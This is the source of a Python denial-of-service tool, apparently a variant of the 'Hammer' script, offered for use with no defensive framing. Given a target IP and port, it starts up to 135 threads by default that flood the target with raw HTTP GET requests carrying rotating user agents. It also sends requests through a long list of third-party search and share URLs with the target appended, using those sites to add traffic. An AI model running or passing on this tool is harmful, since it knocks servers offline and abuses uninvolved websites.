from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_tails():
	global tails
	tails=[]
	tails.append("http://validator.w3.org/check?uri=")
	tails.append("http://www.facebook.com/sharer/sharer.php?u=")
	tails.append("http://www.reddit.com/search?q=")
	tails.append("http://www.bestbuytheater.com/events/search?q=")
	tails.append("http://www.google.com/?q=")
	tails.append("http://jobs.leidos.com/search?q=")
	tails.append("http://jobs.bloomberg.com/search?q=")
	tails.append("https://www.pinterest.com/search/?q=")
	tails.append("http://millercenter.com/search?q=")
	tails.append("https://www.npmjs.com/search?q=")
	tails.append("http://www.evidence.nhs.uk/search?q=")
	tails.append("http://www.shodanhq.com/search?q=")
	tails.append("http://ytmnd.com/search?q=")
	tails.append("http://www.clicksor.com/?q=")
	tails.append("http://www.infinityads.com/?q=")
	tails.append("http://www.multipops.com/?q=")
	tails.append("https://soundcloud.com/search?q=")
	tails.append("https://thenounproject.com/search/?q=")
	tails.append("https://medium.com/search?q=")
	tails.append("http://www.bbc.co.uk/iplayer/search?q=")
	tails.append("http://https://www.addgene.org/search/advanced/?q=")
	tails.append("http://www.lynda.com/search?q=")
	tails.append("http://www.ted.com/search?q=")
	tails.append("http://www.ticketfly.com/search/?q=")
	tails.append("http://https://www.flickr.com/search/?q=")
	tails.append("http://https://dribbble.com/search?q=")
	tails.append("http://steamcommunity.com/market/search?q=")
	tails.append("http://https://www.resus.org.uk/search/?q=")
	tails.append("https://www.ubc.ca/search/?q=")
	tails.append("https://www.nsa.gov/search/?q=")
	tails.append("https://www.rosettacommons.org/docs/latest/search?q=")
	tails.append("https://www.jax.org/search?q=")
	tails.append("https://usa.qdrinkhealthy.com/search?q=")
	tails.append("http://www.theonion.com/search?q=")
	tails.append("http://www.bbc.co.uk/search?q=")
	tails.append("https://www.bing.com/search?q=")
	tails.append("https://shop.wwe.com/search?q=")
	tails.append("https://search.aol.com/aol/search?q=")
	tails.append("https://www.youtube.com/results?search_query=")
	tails.append("https://imgur.com/search?q=")
	tails.append("https://www.yandex.com/search/?text=")
	tails.append("https://atom.io/packages/search?q=")
	tails.append("https://campus.barracuda.com/search?q=")
	return(tails)

def tails_attacking(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("Wooot...")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\m/",time.ctime(time.time()),"<--Wooot! Wooot!-->")
			else:
				s.shutdown(1)
				print("SHUT <---> DOWN")
			time.sleep(.1)
	except socket.error as e:
		print("no connection! server maybe down")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		tails_attacking(random.choice(tails)+"http://"+host)
		w.task_done()


def usage():
	print ('''\m/''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Kurama")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--tails",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\m/",host," Port: ",str(port)," Tails: ",str(thr),"\m/")
	print("Evolving...")
	user_agent()
	my_tails()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("check server ip and port")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
